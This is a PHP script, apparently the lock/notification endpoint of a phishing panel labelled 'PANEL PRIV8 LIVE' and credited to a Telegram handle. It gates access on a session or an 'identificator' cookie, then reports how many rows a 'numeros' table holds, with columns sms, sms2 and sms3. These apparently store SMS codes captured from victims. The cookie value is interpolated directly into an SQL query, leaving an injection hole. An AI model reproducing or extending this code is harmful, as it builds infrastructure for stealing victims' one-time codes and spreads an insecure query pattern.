<?php
/**
* PANEL PRIV8 LIVE
* @package    lock.php
* @author     https://t.me/neo_net
* @copyright  2021
* @version    2.0
* Info :  PHP comment
*/
session_start();
include '../database/db.php';
//include '../defense/ajax.php';
$hash = @$_COOKIE['identificator'];
$fhrji = $connection->query("SELECT hash FROM secure where hash='$hash'");
if (!isset($_SESSION['userSession']) && mysqli_num_rows($fhrji) === 0) {
//Nothing to do boy
}
else {
$notification = $connection->query("SELECT sms,sms2,sms3 FROM numeros");

if(mysqli_num_rows($notification) === 0){
echo '0';
}else{
echo mysqli_num_rows($notification);

}


}